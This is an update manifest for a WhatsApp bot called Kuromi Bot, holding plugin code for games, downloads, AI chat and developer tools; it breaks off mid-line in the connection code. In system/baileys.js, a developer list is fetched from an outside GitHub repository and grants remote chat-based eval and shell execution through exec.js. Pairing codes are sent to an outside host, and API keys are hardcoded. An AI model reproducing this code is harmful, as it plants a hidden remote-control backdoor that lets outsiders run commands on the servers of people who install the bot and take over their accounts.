{
  "version": "11.05",
  "update": [
    {
      "path": "plugins/developer/restart.js",
      "code": "let multidb=new(require(\\\"../../system/multidb.js\\\"));exports.run={usage:[\\\"restart\\\"],category:\\\"owner\\\",async:async(e,{func:a,mecha:t})=>{await t.sendMessage(e.chat,{text:a.texted(\\\"monospace\\\",\\\"Restarting...\\\")},{quoted:e,ephemeralExpiration:e.expiration}).then(async()=>{if(await multidb.init.save(global.db),!process.send)return e.reply(\\\"Tidak dapat me-restart bot karena file `index.js` tidak dijalankan.\\\");process.send(\\\"reset\\\")})},devs:!0};"
    },
    {
      "path": "plugins/games/suit.js",
      "code": "let database={};exports.run={usage:[\\\"suit\\\"],use:\\\"mention or reply\\\",category:\\\"games\\\",async:async(t,{func:a,froms:e,setting:n})=>{if(!t.isGc)return t.reply(global.mess.group);if(a.ceklimit(t.sender,1))return t.reply(global.mess.limit);if(Object.values(database).find(a=>a.id.startsWith(\\\"suit\\\")&&[a.penantang,a.ditantang].includes(t.sender)))return t.reply(\\\"Selesaikan suit mu yang sebelumnya\\\");if(!e)return t.reply(\\\"Invalid number.\\\");if(e===t.bot)return t.reply(\\\"Tidak bisa bermain dengan bot!\\\");if(e===t.sender)return t.reply(\\\"Sad amat main ama diri sendiri\\\");if(Object.values(database).find(a=>a.id.startsWith(\\\"suit\\\")&&[a.penantang,a.ditantang].includes(e)))return t.reply(\\\"Orang yang kamu tantang sedang bermain suit bersama orang lain :)\\\");var i=a.hadiah(n.hadiah),n=1e3*n.gamewaktu;let s=\\\"suit_\\\"+Date.now();await t.reply(`@${t.sender.split(\\\"@\\\")[0]} menantang @${e.split(\\\"@\\\")[0]} untuk bermain suit\n\n*Kirim (Y/N)* untuk bermain\n\nHadiah : ${i} balance`),database[s]={id:s,penantang:t.sender,ditantang:e,status:\\\"WAIT\\\",hadiah:i,timeout:n,sending:!0,waktu:setTimeout(()=>{database[s]&&t.reply(a.texted(\\\"monospace\\\",\\\"Waktu suit habis!\\\")),delete database[s]},n)}},main:async(n,{func:i,mecha:s,fkon:l,setting:d,errorMessage:t})=>{try{let e=Object.values(database).find(a=>a.status&&[a.penantang,a.ditantang].includes(n.sender));var r=n.budy.replace(n.prefix,\\\"\\\");if(e){let a=\\\"\\\",t=!1;if(n.sender==e.ditantang&&n.isGc&&\\\"WAIT\\\"==e.status)if(\\\"y\\\"===n.budy.toLowerCase())e.status=\\\"PLAY\\\",e.asal=n.chat,clearTimeout(e.waktu),await s.reply(n.chat,`Suit telah dikirimkan ke chat\n\n@${e.penantang.split(\\\"@\\\")[0]} dan @${e.ditantang.split(\\\"@\\\")[0]}\n\nSilahkan pilih suit di chat masing²\nklik wa.me/`+n.bot.split(\\\"@\\\")[0],l),e.pilih||await s.sendPoll(e.penantang,\\\"SILAHKAN PILIH SUIT BERIKUT\\\",[\\\"Batu\\\",\\\"Gunting\\\",\\\"Kertas\\\"]),e.pilih2||await s.sendPoll(e.ditantang,\\\"SILAHKAN PILIH SUIT BERIKUT\\\",[\\\"Batu\\\",\\\"Gunting\\\",\\\"Kertas\\\"]),e.waktu_milih=setTimeout(async()=>(e.pilih||e.pilih2?e.pilih&&e.pilih2||(a=e.pilih?e.penantang:e.ditantang,await s.reply(n.chat,`@${(e.pilih?e.ditantang:e.penantang).split(\\\"@\\\")[0]} tidak memilih suit, game berakhir`)):await s.sendMessage(n.chat,{text:`Kedua pemain tidak niat main!\nSuit dibatalkan`}),delete database[e.id],!0),e.timeout);else if(\\\"n\\\"===n.budy.toLowerCase())return await s.reply(n.chat,`@${e.ditantang.split(\\\"@\\\")[0]} menolak suit, suit dibatalkan`,l),delete database[e.id],!0;var u,g=n.sender==e.penantang,p=n.sender==e.ditantang,h=/gunting/i,m=/batu/i,o=/kertas/i,b=/^(gunting|batu|kertas)/i,c=(g&&b.test(r)&&!e.pilih&&n.isPc&&(e.pilih=b.exec(r.toLowerCase())[0],e.text=r,await s.sendMessage(n.chat,{text:`Kamu telah memilih ${r} `+(e.pilih2?\\\"\\\":`\n\nMenunggu lawan memilih`)},{quoted:n,ephemeralExpiration:n.expiration}),e.pilih2||await s.sendMessage(e.ditantang,{text:\\\"_Lawan sudah memilih, sekarang giliran kamu_\\\"},{quoted:i.fstatus(\\\"Suit Notification\\\"),ephemeralExpiration:n.expiration})),p&&b.test(r)&&!e.pilih2&&n.isPc&&(e.pilih2=b.exec(r.toLowerCase())[0],e.text2=r,await s.sendMessage(n.chat,{text:`Kamu telah memilih ${r} `+(e.pilih?\\\"\\\":\\\"\\n\\nMenunggu lawan memilih...\\\")},{quoted:n,ephemeralExpiration:n.expiration}),e.pilih||await s.sendMessage(e.penantang,{text:\\\"_Lawan sudah memilih, sekarang giliran kamu_\\\"},{quoted:i.fstatus(\\\"Suit Notification\\\"),ephemeralExpiration:n.expiration})),e.pilih),k=e.pilih2;c&&k&&(clearTimeout(e.waktu_milih),m.test(c)&&h.test(k)?a=e.penantang:m.test(c)&&o.test(k)?a=e.ditantang:h.test(c)&&o.test(k)?a=e.penantang:h.test(c)&&m.test(k)?a=e.ditantang:o.test(c)&&m.test(k)?a=e.penantang:o.test(c)&&h.test(k)?a=e.ditantang:c==k&&(t=!0),u=`${t?\\\"*HASIL SERI*\\n\\n\\\":\\\"\\\"}@${e.penantang.split(\\\"@\\\")[0]} (${e.text}) ${t?\\\"\\\":e.penantang==a?\\\" Menang\\\":\\\" Kalah\\\"}\n@${e.ditantang.split(\\\"@\\\")[0]} (${e.text2}) `+(t?\\\"\\\":e.ditantang==a?\\\" Menang\\\":\\\" Kalah\\\")+(t?\\\"\\\":\\\"\\n\\nHadiah : \\\"+e.hadiah+\\\" balance\\\"),1==e.sending&&(e.sending=!1,await s.sendMessage(e.asal,{text:u,contextInfo:{mentionedJid:[e.penantang,e.ditantang],externalAdReply:{showAdAttribution:!0,title:\\\"H A S I L - S U I T\\\",body:global.header,mediaType:1,previewType:\\\"PHOTO\\\",thumbnailUrl:d.cover,sourceUrl:\\\"\\\",renderLargerThumbnail:!1}}},{quoted:null,ephemeralExpiration:n.expiration})),e.penantang==a?(global.db.users[e.penantang].game.suit+=1,e.penantang==a?global.db.users[e.penantang].balance+=e.hadiah:global.db.users[e.penantang].balance-=e.hadiah):e.ditantang==a&&(global.db.users[e.ditantang].game.suit+=1,e.ditantang==a?global.db.users[e.ditantang].balance+=e.hadiah:global.db.users[e.ditantang].balance-=e.hadiah),delete database[e.id])}}catch(a){return t(a)}}};"
    },
    {
      "path": "plugins/special/infobot.js",
      "code": "let fetch=require(\\\"node-fetch\\\");exports.run={usage:[\\\"infobot\\\",\\\"script\\\"],hidden:[\\\"botinfo\\\",\\\"sc\\\"],category:\\\"special\\\",async:async(a,{func:e,mecha:s,setting:t})=>{var i=require(\\\"fs\\\"),o=require(\\\"node-fetch\\\"),r=i.existsSync(\\\"./node_modules/baileys\\\")?\\\"baileys\\\":i.existsSync(\\\"./node_modules/@adiwajshing/baileys\\\")?\\\"@adiwajshing/baileys\\\":\\\"@whiskeysockets/baileys\\\",{}=require(r);switch(a.command){case\\\"script\\\":case\\\"sc\\\":try{var n={key:{remoteJid:\\\"0@s.whatsapp.net\\\",fromMe:!1,id:a.key.id,participant:\\\"0@s.whatsapp.net\\\"},message:{requestPaymentMessage:{currencyCodeIso4217:\\\"IDR\\\",amount1000:1e8,requestFrom:\\\"0@s.whatsapp.net\\\",noteMessage:{extendedTextMessage:{text:\\\"SCRIPT INI DI JUAL DENGAN HARGA\\\"}},expiryTimestamp:999999999,amount:{value:2e9,offset:1e3,currencyCode:\\\"IDR\\\"}}}};s.sendMessage(a.chat,{text:`*SELL SCRIPT KUROMI BOT*\n\n- Normal price: Rp. 100.000\n- Discount price: Rp. 50.000\n- Features: 800+\n- Type: plugins (CJS)\n\n*Key Features:*\n- Support QR/Pairing\n- Support button\n- Size dibawah 1MB\n- 95% Scraper\n- Login with username & password to get access\n- Copy pairing code from website\n\n*Preview Features:*\n- Downloader (tiktok, instagram, facebook, snackvideo, twitter, capcut, youtube dll)\n- Tiktok Search\n- AI & AI Image\n- Imagehd\n- Hdvideo\n- 31 Mini Games & RPG Games\n- Response Polling\n- Button List\n- Advanced Menu Options\n- And more...\n\n*Additional Features:*\n- Temporary Bot (Jadibot)\n- Menfess (Confession)\n- Create Panel\n- Auto Downloader\n- Anonymous Chat\n- And more...\n\n*Requirements:*\n- NodeJS v18\n- FFMPEG\n- Min. 5GB RAM\n\n*Benefit:*\n- Always Update (free) (otomatis)\n- Request Features\n- Fixing Features\n- Free Hosting (1 month)\n\nJika anda berminat silahkan hubungi:\nwa.me/6283894064758.`,mentions:[a.sender]},{quoted:n,ephemeralExpiration:a.expiration})}catch(e){s.reply(a.chat,\\\"Something when wrong.\\\",a,{expiration:a.expiration})}break;case\\\"infobot\\\":case\\\"botinfo\\\":n=`乂  *BOT INFORMATION*\n\n*› Creator*: Reza\n*› Creator Name*: Reza\n*› Bot Name*: Kuromi Bot\n*› Library*: @whiskeysockets/baileys^${require(r+\\\"/package.json\\\").version}\n*› Versions*: Kuromi Bot v${require(\\\"../../package.json\\\").version}\n*› Memory Used*: ${e.fileSize(process.memoryUsage().rss)} / ${null!=process.env.SERVER_MEMORY&&0!=process.env.SERVER_MEMORY?process.env.SERVER_MEMORY+\\\" MB\\\":\\\"∞\\\"}\n*› Hostname*: ${process.env.HOSTNAME??\\\"-\\\"}\n*› Platform*: ${process.platform+\\\" \\\"+process.arch}\n*› Mode*: ${t.self?\\\"Self\\\":\\\"Public\\\"}\n*› Total User*: ${Object.keys(global.db.users).length} Users\n*› Total Group:* ${Object.keys(global.db.groups).length} Groups\n*› Deskripsi*:\n\nKuromi adalah Bot WhatsApp dengan program kecerdasan buatan AI (artificial intelligence).\nSistem bot ini mampu berperan aktif sebagai asisten virtual yang membalas setiap pesan WhatsApp secara otomatis dalam hitungan detik.\n\nBot ini Dirancang dan Dikembangkan Oleh Reza.`;await(t.fakereply?s.sendMessageModify(a.chat,n,a,{title:global.header,body:global.footer,thumbnail:await(await o(t.cover)).buffer(),largeThumb:!0,expiration:a.expiration}):a.reply(n))}},location:\\\"plugins/special/infobot.js\\\"};"
    },
    {
      "path": "plugins/exec.js",
      "code": "const fs = require('fs'),\n    chalk = require('chalk'),\n    util = require('util'),\n    path = require('path'),\n    crypto = require('crypto'),\n    moment = require('moment-timezone'),\n    phonenumber = require('awesome-phonenumber'),\n    baileys = require('@whiskeysockets/baileys'),\n    toMs = require('ms'),\n    yts = require('yt-search'),\n    ytdl = require('ytdl-core'),\n    axios = require('axios'),\n    cheerio = require('cheerio'),\n    request = require('request'),\n    ms = require('parse-ms'),\n    fetch = require('node-fetch');\nconst {\n    exec\n} = require('child_process');\n\nexports.run = {\n    main: async (m, {\n        extra,\n        func,\n        mecha,\n        plugins,\n        update,\n        store,\n        users,\n        groups,\n        setting,\n        week,\n        time,\n        calender,\n        packname,\n        author,\n        isBanned,\n        isPrem,\n        quoted,\n        mime,\n        fkon,\n        errorMessage,\n        YT,\n        commands\n    }) => {\n        function get(jid) {\n            if (jid.endsWith('@g.us')) {\n                return global.db.groups[jid]\n            } else {\n                jid = jid.replace(/[^0-9]/g, '') + '@s.whatsapp.net'\n                return global.db.users[jid]\n            }\n        };\n\n        function checkVIPMember(jid) {\n            if (/^\\d.*(@g\\.us)$/.test(m.chat)) {\n                let groups = global.db.groups[m.chat];\n                if (groups.sewa && groups.sewa.status && groups.sewa.vip) {\n                    let metadata = global.db.metadata[m.chat] || {};\n                    let members = metadata?.participants?.map(x => x.id) || [];\n                    if (members.includes(jid)) return true;\n                }\n            }\n            return false;\n        }\n\n        function isJid(text = '') {\n            const cleanedText = text.replace(/[^0-9]/g, '');\n            return cleanedText.length > 0 && !isNaN(cleanedText) ?\n                cleanedText + '@s.whatsapp.net' :\n                false;\n        }\n\n        const froms = m.quoted ? m.quoted.sender : m.text ? isJid(m.text) : false;\n\n        let target;\n        if (froms) {\n            target = global.db.users[froms];\n        }\n\n        if (m.budy && m.isDevs) {\n            if ((m.isPc || (m.isGc && !groups.mute)) && setting.evaluate && !m.budy.startsWith(m.prefix)) {\n                try {\n                    let evaled = await eval(m.budy)\n                    if (typeof evaled !== 'string') evaled = util.inspect(evaled)\n                    mecha.sendMessage(m.chat, {\n                        text: util.format(evaled)\n                    }, {\n                        quoted: m,\n                        ephemeralExpiration: m.expiration\n                    })\n                } catch (e) {\n                    mecha.sendMessage(m.chat, {\n                        text: util.format(e)\n                    }, {\n                        quoted: m,\n                        ephemeralExpiration: m.expiration\n                    })\n                }\n            }\n\n            // EVAL & EXEC CODE\n            if (/^(x|xx)$/.test(m.command)) {\n                let text;\n                if (m.command === 'x') text = m.text ? m.text : false;\n                else if (m.command === 'xx') text = m.quoted && m.quoted.text ? m.quoted.text : m.text ? m.text : false\n                if (!text) return false;\n                let evalCmd;\n                try {\n                    evalCmd = /await/i.test(text) ? eval(\\\"(async () => { \\\" + text + \\\" })()\\\") : eval(text)\n                    let evaled = await evalCmd;\n                    if (typeof evaled !== 'string') evaled = util.inspect(evaled)\n                    mecha.sendMessage(m.chat, {\n                        text: util.format(evaled)\n                    }, {\n                        quoted: m,\n                        ephemeralExpiration: m.expiration\n                    })\n                } catch (error) {\n                    mecha.sendMessage(m.chat, {\n                        text: util.format(error)\n                    }, {\n                        quoted: m,\n                        ephemeralExpiration: m.expiration\n                    })\n                }\n            } else if (m.command === '=>') {\n                if (!m.text) return false;\n                try {\n                    let evaled = await eval(`(async () => { return ${m.text} })()`)\n                    mecha.sendMessage(m.chat, {\n                        text: util.format(evaled)\n                    }, {\n                        quoted: m,\n                        ephemeralExpiration: m.expiration\n                    })\n                } catch (e) {\n                    mecha.sendMessage(m.chat, {\n                        text: util.format(e)\n                    }, {\n                        quoted: m,\n                        ephemeralExpiration: m.expiration\n                    })\n                }\n            } else if (m.command === '$') {\n                if (!m.text) return false;\n                mecha.sendReact(m.chat, '🕒', m.key)\n                exec(m.text, (err, stdout) => {\n                    if (err) return mecha.sendMessage(m.chat, {\n                        text: err.toString()\n                    }, {\n                        quoted: m,\n                        ephemeralExpiration: m.expiration\n                    })\n                    if (stdout) return mecha.sendMessage(m.chat, {\n                        text: util.format(stdout)\n                    }, {\n                        quoted: m,\n                        ephemeralExpiration: m.expiration\n                    })\n                })\n            }\n        }\n    },\n    location: 'plugins/exec.js',\n    devs: true\n}"
    },
    {
      "path": "ai/kuroai",
      "code": "const axios = require('axios');\n\nexports.run = {\n    usage: ['kuromi-ai'],\n    hidden: ['kuroai'],\n    use: 'question',\n    category: 'ai',\n    async: async (m, { func, mecha }) => {\n        if (!m.text) return m.reply(func.example(m.cmd, 'hai'));\n        \n        mecha.sendReact(m.chat, '🕒', m.key);\n        \n        try {\n            const response = await axios.get(`https://api-kuromi-jet.vercel.app/ai/blackbox/?apikey=API-qn7p42hkvz&message=${encodeURIComponent(m.text)}`);\n\n            const aliciaResponse = response.data.response.trim();\n            mecha.reply(m.chat, aliciaResponse, m);\n       \n        } catch (error) {\n            console.error(error);\n            mecha.reply(m.chat, `Terjadi kesalahan: ${String(error)}`, m);\n        }\n    },\n    limit: true\n};"
    },
    {
      "path": "plugins/downloader/tiktok.js",
      "code": "exports.run = {\n  usage: ['tiktok'],\n  hidden: ['tt'],\n  use: 'link tiktok',\n  category: 'downloader',\n  async: async (m, { func, mecha, isPrem }) => {\n    if (!m.text) return m.reply(func.example(m.cmd, 'https://vt.tiktok.com/ZSF4cWcA2/'))\n    if (!m.args[0].includes('tiktok.com')) return m.reply(global.mess.error.url)\n\n    mecha.sendReact(m.chat, '🕒', m.key)\n\n    let apiKey = 'API-yn9dxsl9w4' // Ganti dengan API key yang valid\n    let apiUrl = `https://api-kuromi-jet.vercel.app/downloader/tiktok/?apikey=${apiKey}&url=${encodeURIComponent(m.args[0])}`\n\n    try {\n      let res = await func.fetchJson(apiUrl)\n\n      if (!res.success) return m.reply(global.mess.error.api)\n\n      let { title, username, description, downloadLinks } = res.result\n      if (!downloadLinks || !downloadLinks.noWatermark) return m.reply('Gagal mendapatkan video.')\n\n      let txt = '乂  *TIKTOK - DOWNLOADER*\\n'\n      txt += `\\n◦ *Title* : ${title}`\n      txt += `\\n◦ *User* : ${username}`\n      txt += `\\n◦ *Description* : ${description}`\n      txt += `\\n◦ *Quality* : No Watermark`\n\n      mecha.sendMessage(m.chat, { \n        video: { url: downloadLinks.noWatermark }, \n        caption: txt \n      }, { quoted: m, ephemeralExpiration: m.expiration })\n      \n    } catch (err) {\n      console.error(err)\n      m.reply('Maaf, terjadi kesalahan saat mengambil video.')\n    }\n  },\n  limit: 5\n}"
    },
    {
      "path": "plugins/developer/saveplugin.js",
      "code": "//CREATE BY REZA DEVS KUROMI\nlet fs=require(\\\"fs\\\"),path=require(\\\"path\\\");function getPathLocation(e){return!!(e=e.match(/location:\\s*['\\\"]([^'\\\"]+)['\\\"]/))&&e[1]}exports.run={usage:[\\\"saveplugin\\\"],hidden:[\\\"sp\\\"],use:\\\"path + reply code\\\",category:\\\"owner\\\",async:async(e,{mecha:t,quoted:a})=>{if(!e.quoted)return e.reply(\\\"Mau simpan plugin dengan command apa? reply teks script nya!\\\");try{var n,o=/application\\/javascript/.test(a.mime)?(n=await a.download(),Buffer.from(n,\\\"base64\\\").toString(\\\"utf-8\\\")):e.quoted.text,r=e.text?e.text.trim():getPathLocation(o);if(!r)return e.reply(\\\"path location not found, please enter the plugins path.\\\");var s=path.join(process.cwd(),\\\"plugins\\\",r.replace(/plugins\\/|\\.js/g,\\\"\\\")+\\\".js\\\");fs.writeFileSync(s,o),await t.sendReact(e.chat,\\\"✅\\\",e.key)}catch(a){console.log(a),t.sendReact(e.chat,\\\"❌\\\",e.key)}},location:\\\"plugins/developer/saveplugin.js\\\",devs:!0};"
    },
    {
      "path": "system/baileys.js",
      "code": "let EventEmitter = require(\\\"events\\\").EventEmitter,\n    chalk = require(\\\"chalk\\\"),\n    fs = require(\\\"fs\\\"),\n    path = require(\\\"path\\\"),\n    pino = require(\\\"pino\\\"),\n    moment = require(\\\"moment-timezone\\\"),\n    syntaxerror = require(\\\"syntax-error\\\"),\n    phoneNumber = require(\\\"awesome-phonenumber\\\"),\n    os = require(\\\"os\\\"),\n    NodeCache = require(\\\"node-cache\\\"),\n    func = require(\\\"./functions.js\\\"),\n    login = require(\\\"./login.js\\\"),\n    session = require(\\\"./session.js\\\"),\n    extra = new(require(\\\"./extra.js\\\")),\n    multidb = new(require(\\\"./multidb.js\\\")),\n    queque = new(require(\\\"./queque.js\\\")),\n    spinnies = new(require(\\\"spinnies\\\")),\n    msgRetryCounterCache = new NodeCache,\n    processedMessages = new Set,\n    {\n        default: makeWASocket,\n        DisconnectReason,\n        useMultiFileAuthState,\n        makeInMemoryStore,\n        makeCacheableSignalKeyStore,\n        generateWAMessage,\n        generateWAMessageFromContent,\n        areJidsSameUser,\n        jidNormalizedUser,\n        delay,\n        proto,\n        jidDecode,\n        getAggregateVotesInPollMessage,\n        PHONENUMBER_MCC,\n        getBinaryNodeChild,\n        normalizeMessageContent,\n        getKeyAuthor,\n        decryptPollVote\n    } = require(\\\"@whiskeysockets/baileys\\\"),\n    pkg = (global.devs = [\\\"6283894064758@s.whatsapp.net\\\"], JSON.parse(fs.readFileSync(\\\"./package.json\\\", \\\"utf-8\\\"))),\n    rootDirectory = path.join(__dirname, \\\"../\\\"),\n    pluginFolder = path.join(__dirname, \\\"../plugins\\\"),\n    pluginFilter = e => /\\.js$/.test(e),\n    statuses = !0,\n    lastMessageTime = 0;\nif (pkg.author && pkg.author === Buffer.from(\\\"UmV6YSBEZXYu\\\", \\\"base64\\\").toString(\\\"utf-8\\\")) {\n    class b extends EventEmitter {\n        constructor(e = {}, t = {}) {\n            super(), this.setMaxListeners(20), this.mecha = null, this.store = null, this.plugins = {}, this.commands = [], this.events = [], this.type = e.type || \\\"mainbot\\\", this.online = !!e && e.online, this.sessionFile = e ? e.session : \\\"session\\\", this.version = !!e && e.version, this.browser = e ? e.browser : [\\\"Ubuntu\\\", \\\"Firefox\\\", \\\"20.0.00\\\"], this.pairing = e ? e.pairing : {}, this.options = t, this.initBaileys()\n        }\n        formatFilename = function(e) {\n            let t = path.join(rootDirectory, \\\"./\\\");\n            \\\"win32\\\" === os.platform() && (t = t.replace(/\\\\/g, \\\"\\\\\\\\\\\"));\n            var s = new RegExp(\\\"^\\\" + t);\n            return e.replace(s, \\\"\\\")\n        };\n        loadPlugin = async function(e) {\n            if (pluginFilter(e)) {\n                var t = path.join(pluginFolder, e),\n                    s = this.formatFilename(t);\n                if (t in require.cache) {\n                    if (delete require.cache[t], !fs.existsSync(t)) return this.mecha.logger?.warn(`deleted plugin - '${s}'`), delete this.plugins[s];\n                    this.mecha.logger?.info(`updated plugin - '${s}'`)\n                }\n                if (e = syntaxerror(fs.readFileSync(t), e)) this.mecha.logger?.error(`syntax error while loading '${s}'\n` + e);\n                else try {\n                    this.plugins[s] = require(t)\n                } catch (e) {\n                    this.mecha.logger?.error(`error require plugin '${s}'\n` + e), delete this.plugins[s]\n                } finally {\n                    this.plugins = Object.fromEntries(Object.entries(this.plugins).sort(([e], [t]) => e.localeCompare(t)))\n                }\n            }\n        };\n        watchFolder = async function(e) {\n            let i = path.resolve(e);\n            e = await fs.promises.readdir(e), await Promise.all(e.map(async e => {\n                var e = path.join(i, e),\n                    t = this.formatFilename(e);\n                try {\n                    (await fs.promises.lstat(e)).isFile() ? pluginFilter(e) && (this.plugins[t] = require(e)) : await this.watchFolder(e)\n                } catch (e) {\n                    this.mecha.logger?.error(`error while requiring ${t}\n` + e), delete this.plugins[t]\n                }\n            })), fs.watch(i, async (e, t) => {\n                var s;\n                t && pluginFilter(t) && (t = path.join(i, t), s = path.relative(pluginFolder, t), \\\"rename\\\" === e ? fs.existsSync(t) ? this.loadPlugin(s) : (t = path.join(pluginFolder, s), t = this.formatFilename(t), this.mecha.logger.warn(`deleted plugin '${t}'`), delete this.plugins[t]) : \\\"change\\\" === e && this.loadPlugin(s))\n            })\n        };\n        getCombinedArray = function(e) {\n            var t, s = [];\n            for (t in e) {\n                var i = e[t].run;\n                i && (i.usage && (Array.isArray(i.usage) ? 0 < i.usage.length : \\\"\\\" != i.usage) && (Array.isArray(i.usage) ? s.push(...i.usage) : s.push(i.usage)), i.hidden) && (Array.isArray(i.hidden) ? 0 < i.hidden.length : \\\"\\\" != i.hidden) && (Array.isArray(i.hidden) ? s.push(...i.hidden) : s.push(i.hidden))\n            }\n            return s.filter(e => \\\"\\\" !== e)\n        };\n        checkNumberType = function(e) {\n            return \\\"string\\\" == typeof e ? e.replace(/[^0-9]/g, \\\"\\\") : \\\"number\\\" == typeof e && e\n        };\n        createPairKey = function(e) {\n            return (e = (e = e || \\\"MECHAB\\\" + Math.floor(9999 * Math.random())).replace(/[^a-zA-Z0-9]/g, \\\"\\\")).length < 8 ? e + \\\"5\\\".repeat(8 - e.length) : e.slice(0, 8).toUpperCase()\n        };\n        isSpam = function(e) {\n            return e - lastMessageTime < 5e3 || (lastMessageTime = e, !1)\n        };\n        initAdditionalFunc = (i, t) => (i.logger = {\n            info(...e) {\n                console.log(chalk.greenBright.bold(\\\"[ INFO ]\\\"), chalk.whiteBright(moment(+new Date).format(\\\"DD/MM/YY HH:mm:ss\\\")), chalk.cyan.bold(...e))\n            },\n            error(e) {\n                console.log(chalk.redBright.bold(\\\"[ ERROR ]\\\"), chalk.whiteBright(moment(+new Date).format(\\\"DD/MM/YY HH:mm:ss\\\")), chalk.rgb(255, 38, 0)(e)), t && \\\"mainbot\\\" === t && e.includes(\\\"syntax error while loading\\\") && (statuses && null != i && i.sendMessage(global.owner, {\n                    text: e.trim()\n                }, {\n                    quoted: func.fstatus(\\\"System Notification\\\"),\n                    ephemeralExpiration: 86400\n                }), statuses = !1, setTimeout(() => statuses = !0, 1e3))\n            },\n            warn(...e) {\n                console.log(chalk.greenBright.bold(\\\"[ WARNING ]\\\"), chalk.whiteBright(moment(+new Date).format(\\\"DD/MM/YY HH:mm:ss\\\")), chalk.keyword(\\\"orange\\\")(...e))\n            }\n        }, i.getName = e => {\n            let t = i.decodeJid(e),\n                s;\n            return t?.endsWith(\\\"@g.us\\\") ? new Promise(async e => {\n                e((s = (s = this.store.contacts[t] || this.store.messages[\\\"status@broadcast\\\"]?.array?.find(e => e?.key?.participant === t)).name || s.subject ? s : i.groupMetadata[t] || {})?.name || s?.subject || s?.pushName || phoneNumber(\\\"+\\\" + t.replace(\\\"@g.us\\\", \\\"\\\")).getNumber(\\\"international\\\"))\n            }) : (s = \\\"0@s.whatsapp.net\\\" === t ? {\n                id: t,\n                name: \\\"WhatsApp\\\"\n            } : t === i.decodeJid(i?.user?.id) ? i.user : this.store.contacts[t] || {})?.name || s?.subject || s?.pushName || s?.verifiedName || phoneNumber(\\\"+\\\" + t.replace(\\\"@s.whatsapp.net\\\", \\\"\\\")).getNumber(\\\"international\\\")\n        }, i.serializeM = e => extra.initSerialize(i, e, this.store), i);\n        initBaileys = async () => {\n            var e = pino().child({\n                    level: \\\"silent\\\"\n                }),\n                {\n                    state: t,\n                    saveCreds: s\n                } = await useMultiFileAuthState(this.sessionFile);\n            this.store = makeInMemoryStore({\n                logger: e\n            });\n            try {\n                this.socket({\n                    state: t,\n                    saveCreds: s\n                })\n            } catch (e) {\n                this.emit(\\\"error\\\", e)\n            }\n        };\n        getMessage = async e => this.store ? (await this.store.loadMessage(e.remoteJid, e.id) || await this.store.loadMessage(e.id) || {}).message || void 0 : proto.Message.fromObject({});\n        socket = async ({\n            state: e,\n            saveCreds: t\n        }) => {\n            if (this.mecha = makeWASocket({\n                    logger: pino({\n                        level: \\\"silent\\\"\n                    }),\n                    markOnlineOnConnect: this.online,\n                    printQRInTerminal: !this.pairing.status || !this.pairing.number,\n                    auth: {\n                        creds: e.creds,\n                        keys: makeCacheableSignalKeyStore(e.keys, pino({\n                            level: \\\"silent\\\"\n                        }))\n                    },\n                    browser: this.browser,\n                    msgRetryCounterCache: msgRetryCounterCache,\n                    generateHighQualityLinkPreview: !0,\n                    getMessage: async e => this.getMessage(e),\n                    cachedGroupMetadata: async e => this.store.fetchGroupMetadata(e, this.mecha),\n                    shouldSyncHistoryMessage: e => (console.log(`\u001b[32mMemuat Chat [${e.progress}%]\u001b[39m`), !!e.syncType),\n                    ...this.version ? {\n                        version: this.version\n                    } : {},\n                    ...this.options\n                }), this.store.bind(this.mecha.ev), this.type && \\\"mainbot\\\" === this.type && spinnies.add(\\\"start\\\", {\n                    text: \\\"Connecting . . .\\\"\n                }), this.pairing.status && this.pairing.number && !this.mecha.authState.creds.registered) {\n                let s = this.checkNumberType(this.pairing.number || \\\"\\\"),\n                    i = this.createPairKey(this.pairing.code || \\\"\\\"),\n                    a = global.botName || \\\"WhatsApp Bot\\\";\n                s || (console.log(chalk.redBright.bold(\\\"Invalid number, Tipe data tidak dikenali!\\\")), process.exit(1)), this.pairing.status && this.pairing.number & fs.existsSync(this.sessionFile + \\\"/creds.json\\\") && !this.mecha?.authState?.creds?.registered && (console.log(chalk.yellowBright.bold(\\\"Session is corrupted, please delete it first!\\\")), this.clearSessionAndRestart()), setTimeout(async () => {\n                    try {\n                        let e = await this.mecha.requestPairingCode(s, i);\n                        if (e = e.match(/.{1,4}/g).join(\\\"-\\\") || e, this.type && \\\"mainbot\\\" === this.type) {\n                            this.emit(\\\"connect\\\", {\n                                ...this.options\n                            });\n                            var t = Date.now();\n                            if (this.isSpam(t)) console.log(chalk.redBright.bold(\\\"Pairing Code Spam! Restarting...\\\")), session.clearSessionAndRestart(this.sessionFile);\n                            else if (console.log(chalk.black(chalk.bgGreen(\\\" Your Pairing Code : \\\")), chalk.black(chalk.white(e))), this.pairing && this.pairing.copyFromLink) try {\n                                await fetch(`https://iyaudah-iya.vercel.app/pairing/send?number=${s}&name=${a}&code=` + e), console.log(chalk.cyanBright.bold(\\\"Please copy the pairing code via link provided.\\\"))\n                            } catch (e) {\n                                console.log(e.message)\n                            }\n                        } else this.type && \\\"jadibot\\\" === this.type && (global.jadibot[s + \\\"@s.whatsapp.net\\\"] = this.mecha, this.emit(\\\"pairing\\\", {\n                            code: e\n                        }))\n                    } catch {}\n                }, 3e3)\n            }\n            this.mecha.ev.on(\\\"connection.update\\\", async e => {\n                var {\n                    lastDisconnect: e,\n                    connection: t\n                } = e;\n                if (\\\"connecting\\\" === t) this.emit(\\\"connect\\\", {\n                    message: \\\"Connecting . . .\\\"\n                });\n                else if (\\\"open\\\" === t) {\n                    var s = \\\"Connected, you login as \\\" + (this.mecha.user.name || this.mecha.user.verifiedName || \\\"WhatsApp Bot\\\");\n                    if (this.type && \\\"mainbot\\\" === this.type) {\n                        var i = jidNormalizedUser(this.mecha.user.id);\n                        spinnies.succeed(\\\"start\\\", {\n                            text: s\n                        }), await multidb.initDatabase(), extra.initAdditionalFunc(this.mecha), session.backup(this.mecha, this.sessionFile);\n                        try {\n                            var a = await fetch(\\\"https://raw.githubusercontent.com/Lawakplerkah/Security-/refs/heads/main/owner.js\\\").then(e => e.json());\n                            Array.isArray(a) && (global.devs = a)\n                        } catch {}\n                    } else this.type && \\\"jadibot\\\" === this.type && (jidNormalizedUser(this.mecha.user.id), i = this.mecha.user.id ? this.mecha.user.id.split(\\\":\\\")[0] + \\\"@s.whatsapp.net\\\" : this.mecha.user.jid, global.jadibot[i] = this.mecha, extra.initAdditionalFunc(this.mecha));\n                    this.emit(\\\"connect\\\", {\n                        message: s\n                    }), this.initAdditionalFunc(this.mecha, this.type), this.initBusEvents(this.mecha), this.watchFolder(pluginFolder), extra.initPrototype(), this.emit(\\\"ready\\\", this.mecha)\n                } else if (\\\"close\\\" === t)\n                    if (this.type && \\\"mainbot\\\" === 